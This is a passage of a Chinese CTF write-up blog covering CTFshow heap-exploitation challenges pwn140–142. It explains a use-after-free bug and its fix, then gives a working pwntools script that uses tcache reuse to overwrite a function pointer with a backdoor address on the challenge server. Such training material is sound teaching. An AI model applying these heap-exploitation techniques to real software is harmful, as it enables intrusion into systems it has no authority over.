+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">pthread<span class="hljs-emphasis">_create(&amp;newthread, 0LL, threadFunc, 0LL) </span><br></code></pre></td></tr></table></figure>
+
+<p>&amp;newthread是存储新线程的ID，0LL表示线程属性默认</p>
+<p>threadFunc是接下来要执行的函数，0LL是参数NULL</p>
+<p>其次是pthread_join，第一个参数是要等待的线程ID，第二个参数的存储子线程的返回值</p>
+<p>等待子线程结束，主要是堵在这边</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775663166928-3f149508-6de1-4e5b-9ace-7b6ba34945bb.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到又malloc了一次，根据我们分析的，这个不会从主线程的tcache里读了，会另外开辟个</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775662805877-09c98cb6-dd4c-4938-a10f-e679609b8560.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775663418326-aa639bb2-b50c-45e7-b11c-a20c4983a520.png" srcset="/img/loading.gif" lazyload></p>
+<p>不同版本还不一样，不过大差不差</p>
+<p>最后就是成功又free完然后跳flag了，没什么含义</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775663581867-97799586-2eac-4a98-bc15-63a8f3dd4496.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="pwn141"><a href="#pwn141" class="headerlink" title="pwn141"></a>pwn141</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775694927905-a8f09e3b-4435-4f43-a8f1-35e980dc0b80.png" srcset="/img/loading.gif" lazyload></p>
+<p>保护：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775694961987-a3b226da-977f-4ce6-b629-d26c6bfef2d1.png" srcset="/img/loading.gif" lazyload></p>
+<p>从头来看，上来先呈现了一个菜单，大概介绍了这个程序的功能</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775695710741-068ea546-edb4-4add-a4ef-58fef4ae4c81.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775695729162-c46c6e47-953c-41d0-a6e1-398a3d1c84bc.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到main函数是一个初始化和菜单选择，4就直接exit，然后123都跟着菜单来，我们一个个跟着看</p>
+<p>首先是1，也就是Add note</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775695794603-3baeecc3-d27b-4e49-ba69-cc813f314d40.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到这边进行了两次malloc</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-emphasis">*((_DWORD *</span>)&amp;notelist + i) = malloc(8u);<br><span class="hljs-strong">**((<span class="hljs-emphasis">_DWORD **)&amp;notelist + i) = print_</span>note<span class="hljs-emphasis">_content;</span></span><br><span class="hljs-emphasis"><span class="hljs-strong"></span></span><br><span class="hljs-emphasis"><span class="hljs-strong">read(0, buf, 8u);</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">size = atoi(buf);</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">v0 = *((_</span>DWORD <span class="hljs-emphasis">*)&amp;notelist + i);</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">*</span>(<span class="hljs-emphasis">_DWORD *)(v0 + 4) = malloc(size);</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">read(0, *(void **)(*((_</span>DWORD <span class="hljs-emphasis">*)&amp;notelist + i) + 4), size);</span></span><br></code></pre></td></tr></table></figure>
+
+<p>第一次申请的chunk0申请了8个字节，由于是32位系统，指针4字节，这个申请的8字节就拿来容纳两个指针</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown">+----------------------+  ← 元数据块起始地址<br>| 前4字节：函数指针       |  ← (<span class="hljs-emphasis">*((_DWORD *</span>)&amp;notelist + i))<br>+----------------------+<br>| 后4字节：数据缓冲区指针  |  ← (<span class="hljs-emphasis">*((_DWORD *</span>)&amp;notelist + i) + 4)<br>+----------------------+<br></code></pre></td></tr></table></figure>
+
+<p>之后读取我们输入的size，在数据缓冲区指针处继续扩大，利用malloc函数在这边继续分配数据缓冲区</p>
+<p>从功能来看，前四字节后边接受的是print_note_content的函数指针，作为一个输出作用的函数</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775696619259-695532b1-d88f-4a65-b316-6163db12ed62.png" srcset="/img/loading.gif" lazyload></p>
+<p>而后一个申请的数据缓冲区则是拿来存储读入的数据</p>
+<p>接下来add就没什么东西了，来看&#x3D;2的delete情况</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775696701713-27abbb1f-5865-433f-a11c-d84a716a6132.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到delete前有对chunk数量进行审查，之后第二个if开始了free</p>
+<p>但是这边只free了chunk，没有将指针也进行置空，这边free实际上是把原来的数据放到了适当的bin，其内容并未被删除，只是使用权被交还，属于一块无主之地，而且这边指针没置空，因此我们仍然拥有访问这个无主之地的门牌号，拿旧的指针就能进行篡改、访问、从而也就是二次利用了</p>
+<p>这就是UAF漏洞——Use after free</p>
+<p>修复也很简单，没置空嘛，置空就好了</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown">free(<span class="hljs-emphasis">*((void <span class="hljs-strong">**)&amp;notelist + v1));</span></span><br><span class="hljs-strong"><span class="hljs-emphasis"></span></span><br><span class="hljs-strong"><span class="hljs-emphasis">*((void **</span>)&amp;notelist + v1) = NULL;</span><br><span class="hljs-emphasis">汇编大致 --&gt; mov     dword ptr [eax+edx*</span>4], 0<br></code></pre></td></tr></table></figure>
+
+<p>在原来的基础上增加一行对于指针的置空即可</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">mov     eax, offset notelist    ; 加载notelist的地址到eax<br>mov     edx, [ebp+var<span class="hljs-emphasis">_14]       ; 加载索引v1到edx</span><br><span class="hljs-emphasis">mov     dword ptr [eax+edx*4], 0 ; 将notelist[v1]设为NULL</span><br></code></pre></td></tr></table></figure>
+
+<p>差不多13字节的修改（具体还是要看架构不同，字节数也不一样，汇编也不一样，具体情况具体看）</p>
+<p>好delete看完了，这边是UAF漏洞的主战场，继续往后看&#x3D;3的print</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775697577795-8bff7c3d-dcec-4d47-83fc-3170382c897e.png" srcset="/img/loading.gif" lazyload></p>
+<p>前边检测是一样的，重点在这句话</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">(<span class="hljs-strong">**((void (_<span class="hljs-emphasis">_cdecl ***)(_</span>DWORD))&amp;notelist + v1))(<span class="hljs-emphasis">*((_DWORD *</span>)&amp;notelist + v1));</span><br></code></pre></td></tr></table></figure>
+
+<p>即将chunk2的内容作为参数，通过chunk1的输出函数执行</p>
+<p>三个分析完之后又可以发现本程序具有后门函数</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775697695562-56af87b0-36f8-4efb-bfca-69a12b6ab388.png" srcset="/img/loading.gif" lazyload></p>
+<p>backdoor &#x3D; 0x8049684</p>
+<p>至此我们明白了，我们可以利用UAF漏洞，将chunk1存放的输出函数地址改为后门地址，从而触发后门，得到flag</p>
+<p>但是我们只能往chunk2写东西啊，这个chunk1不是我们可以说改就改的</p>
+<p>这就是本题的重点了，我们要想办法修改，这边利用了之前说过的tcache bin的特性，即在申请chunk的时候会先从tcache bin进行查看，如果有大小刚好相等的chunk就拿来用，我们可以动调看看这个函数在运行过程中的heap变化以及tcache变化</p>
+<p>做这种堆题目的时候有很多的功能菜单，我们可以将其整理为函数方便后边使用，至于菜单，可以写在不同函数内部，也可以直接单独写一个menu功能函数，是一样的，出于清晰角度，我们还是分开来写一个菜单函数好了</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs markdown">from pwn import *<br>context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log<span class="hljs-emphasis">_level=&#x27;debug&#x27;)</span><br><span class="hljs-emphasis">io = process(&#x27;./pwn141&#x27;)</span><br><span class="hljs-emphasis"># io = remote(&quot;pwn.challenge.ctf.show&quot;,28234)</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">def menu(choice):</span><br><span class="hljs-emphasis">    io.sendlineafter(b&#x27;choice :&#x27;,str(choice))</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">def add_</span>note(size,data):<br><span class="hljs-code">    menu(1)</span><br><span class="hljs-code">    io.sendlineafter(b&#x27;Note size :&#x27;,str(size))</span><br><span class="hljs-code">    io.sendlineafter(b&#x27;Content :&#x27;,data)</span><br><span class="hljs-code"></span><br>def del<span class="hljs-emphasis">_note(index):</span><br><span class="hljs-emphasis">    menu(2)</span><br><span class="hljs-emphasis">    io.sendlineafter(b&#x27;Index :&#x27;,str(index))</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">def print_</span>note(index):<br><span class="hljs-code">    menu(3)</span><br><span class="hljs-code">    io.sendlineafter(b&#x27;Index :&#x27;,str(index))</span><br></code></pre></td></tr></table></figure>
+
+<p>像这样子把几个函数写完方便我们后边直接用，接下来来基于此动调看看heap</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">add<span class="hljs-emphasis">_note(0x10,b&#x27;aaaa&#x27;)</span><br><span class="hljs-emphasis">gdb.attach(io)</span><br><span class="hljs-emphasis">io.interactive()</span><br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775699854808-ac4e6709-258f-4ed8-8703-61b2c1c94b23.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到这是两次add之后的heap结构，按道理第二个，第四个chunk那边就是可以看到我们写入内容的地方</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">x/30x 0x......<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775699841238-63f5b103-3466-49e5-874f-c364bf261d64.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到我们写的内容很清楚在这边</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">telescope 0x80492D6 20<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775699896036-e70e7a76-1837-4147-89eb-619b9686edc8.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到print_note_content的使用情况</p>
+<p>继续看看free完之后的heap情况</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs markdown">add<span class="hljs-emphasis">_note(0x10,b&#x27;aaaa&#x27;)</span><br><span class="hljs-emphasis">add_</span>note(0x10,b&#x27;bbbb&#x27;)<br>del<span class="hljs-emphasis">_note(0)</span><br><span class="hljs-emphasis">del_</span>note(1)<br>gdb.attach(io)<br>l = input()<br>add<span class="hljs-emphasis">_note(0x8,p32(0x8049684))</span><br><span class="hljs-emphasis">gdb.attach(io)</span><br><span class="hljs-emphasis">io.interactive()</span><br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775700725735-081fc90c-703c-4d9e-866b-fdaa32c5f8d7.png" srcset="/img/loading.gif" lazyload></p>
+<p>这边提示放到tcache了，先进后出</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775700738249-ddadcff0-8f5f-4ce0-94b9-9fe1289a0090.png" srcset="/img/loading.gif" lazyload></p>
+<p>如果这个时候我们向程序要两个0x10的chunk，就会拿这俩</p>
+<p>而且由于特性，是后释放的先被申请，所以下边那个chunk是chunk1，上边那个是chunk2</p>
+<p>所以如果我们现在执行add_note(0x8,p32(0x8049684))</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775700794877-bda6f149-2e88-4f66-9f6d-35316ecb2d63.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775700830745-ded465aa-6c3a-4732-a57c-b8a7dd6ee9cd.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以发现是上边那个chunk0里存在着我们塞进去的后门</p>
+<p>这意味着我们成功劫持第一组的chunk0的print函数</p>
+<p>总结来说，就是我们一开始add两次释放两次，得到了两个tcache，之后再一次分配的时候由于LIFO分配顺序，反着读了，从而我们第三次把写入的地址参数作为指针填在里边，执行了</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs markdown">初始状态：<br>notelist[0] -&gt; 结构体0 -&gt; 内容0<br>notelist[1] -&gt; 结构体1 -&gt; 内容1<br><br>释放后：<br>fastbin: 结构体1 -&gt; 结构体0 -&gt; NULL<br><br>重新分配：<br>新结构体 = 结构体1（从fastbin头部取）<br>新内容 = 结构体0（从fastbin取下一个）<br><br>结果：<br>notelist[0] 仍指向 结构体0（现在被用作内容chunk）<br>写入数据到新内容 = 覆盖结构体0的函数指针<br></code></pre></td></tr></table></figure>
+
+<p>system cat了，之后调用一次print即可</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs markdown">from pwn import *<br>context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log<span class="hljs-emphasis">_level=&#x27;debug&#x27;)</span><br><span class="hljs-emphasis"># io = process(&#x27;./pwn141&#x27;)</span><br><span class="hljs-emphasis">io = remote(&quot;pwn.challenge.ctf.show&quot;,28234)</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">def menu(choice):</span><br><span class="hljs-emphasis">    io.sendlineafter(b&#x27;choice :&#x27;,str(choice))</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">def add_</span>note(size,data):<br><span class="hljs-code">    menu(1)</span><br><span class="hljs-code">    io.sendlineafter(b&#x27;Note size :&#x27;,str(size))</span><br><span class="hljs-code">    io.sendlineafter(b&#x27;Content :&#x27;,data)</span><br><span class="hljs-code"></span><br>def del<span class="hljs-emphasis">_note(index):</span><br><span class="hljs-emphasis">    menu(2)</span><br><span class="hljs-emphasis">    io.sendlineafter(b&#x27;Index :&#x27;,str(index))</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">def print_</span>note(index):<br><span class="hljs-code">    menu(3)</span><br><span class="hljs-code">    io.sendlineafter(b&#x27;Index :&#x27;,str(index))</span><br><span class="hljs-code"></span><br>add<span class="hljs-emphasis">_note(0x10,b&#x27;aaaa&#x27;)</span><br><span class="hljs-emphasis">add_</span>note(0x10,b&#x27;bbbb&#x27;)<br>del<span class="hljs-emphasis">_note(0)</span><br><span class="hljs-emphasis">del_</span>note(1)<br>add<span class="hljs-emphasis">_note(0x8,p32(0x8049684))</span><br><span class="hljs-emphasis">sleep(0.5)</span><br><span class="hljs-emphasis">print_</span>note(0)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775702208808-7ba69c49-a72a-4d85-8d7d-366748716f5b.png" srcset="/img/loading.gif" lazyload></p>
+<p>成功得到flag</p>
+<h2 id="pwn142"><a href="#pwn142" class="headerlink" title="pwn142"></a>pwn142</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775702436837-90788793-726f-48f8-ad2f-77ce6e7698d2.png" srcset="/img/loading.gif" lazyload></p>
+<p>保护：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775702425864-bf2cd448-9a0e-421a-9373-049d1ab67e7f.png" srcset="/img/loading.gif" lazyload></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
+      
+        <a href="/tags/Pwn/" class="print-no-link">#Pwn</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>CTFshow-Pwn入门堆利用-前置基础(135-141)</div>
+      <div>https://mei-you-qian.github.io/2026/04/10/堆利用-前置基础/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Meiyouqian</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年4月10日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/04/10/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/" title="CTFshow-Pwn入门Bypass安全机制(111-120))">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">CTFshow-Pwn入门Bypass安全机制(111-120))</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/04/01/%E9%9D%92%E5%B0%91%E5%B9%B4CTF_S1/" title="青少年CTF S1 · 2026 公益赛wp">
+                        <span class="hidden-mobile">青少年CTF S1 · 2026 公益赛wp</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="twikoo"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/twikoo/1.6.8/twikoo.all.min.js', function() {
+        var options = Object.assign(
+          {"envId":"cloud1-9g1zftrh46f4164f","region":"ap-shanghai","path":"window.location.pathname"},
+          {
+            el: '#twikoo',
+            path: 'window.location.pathname',
+            onCommentLoaded: function() {
+              Fluid.utils.listenDOMLoaded(function() {
+                var imgSelector = '#twikoo .tk-content img:not(.tk-owo-emotion)';
+                Fluid.plugins.imageCaption(imgSelector);
+                Fluid.plugins.fancyBox(imgSelector);
+              });
+            }
+          }
+        )
+        twikoo.init(options)
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
